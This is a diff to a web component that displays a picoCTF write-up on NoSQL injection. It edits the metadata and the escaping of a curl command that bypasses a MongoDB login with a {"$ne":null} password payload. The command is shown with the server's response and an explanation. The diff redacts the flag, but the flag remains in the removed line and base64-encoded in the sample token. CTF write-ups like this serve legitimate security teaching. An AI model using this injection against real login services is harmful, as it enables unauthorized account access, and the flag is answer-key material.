@@ -4,13 +4,13 @@ import WriteupTemplate from '@/components/WriteupTemplate';
 
 export default function NoSQLInjectionWriteup() {
   const writeupData = {
-    title: 'No SQL Injection',
+    title: 'No Sql Injection',
     category: 'Web Exploitation',
-    points: '[000]',
-    author: 'Kelvin',
+    points: 'n/a',
+    author: 'Kelvin Creighton',
     difficulty: 'medium' as const,
-    tags: ['nosqli', 'web', 'mongodb'],
-    flag: 'picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}',
+    tags: ['nosqli', 'web', 'mongodb', 'base64'],
+    flag: 'picoCTF{...}',
     sections: [
       {
         title: 'Research',
@@ -59,9 +59,9 @@ export default function NoSQLInjectionWriteup() {
           {
             number: '01',
             label: 'Bypassing Authentication with `$ne`',
-            input: `curl -s -X POST http://[target]/login -H 'Content-Type: application/json' -d '{"email":"picoplayer355@picoctf.org","password":"{\"$ne\":null}"}'`,
+            input: `curl -s -X POST http://[target]/login -H 'Content-Type: application/json' -d '{"email":"picoplayer355@picoctf.org","password":"{\\"$ne\\":null}"}'`,
             output: `{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==","firstName":"pico","lastName":"player"}`,
-            reason: '<strong>Reason:</strong> The payload `{"$ne":null}` translates to "not equal to null". Since every user has a password, this condition is true. The database finds the user matching the email and a non-null password, granting us access.',
+            reason: '<strong>Reason:</strong> The payload `{\\"$ne\\":null}` translates to "not equal to null". Since every user has a password, this condition is true. The database finds the user matching the email and a non-null password, granting us access.',
           },
           {
             number: '02',
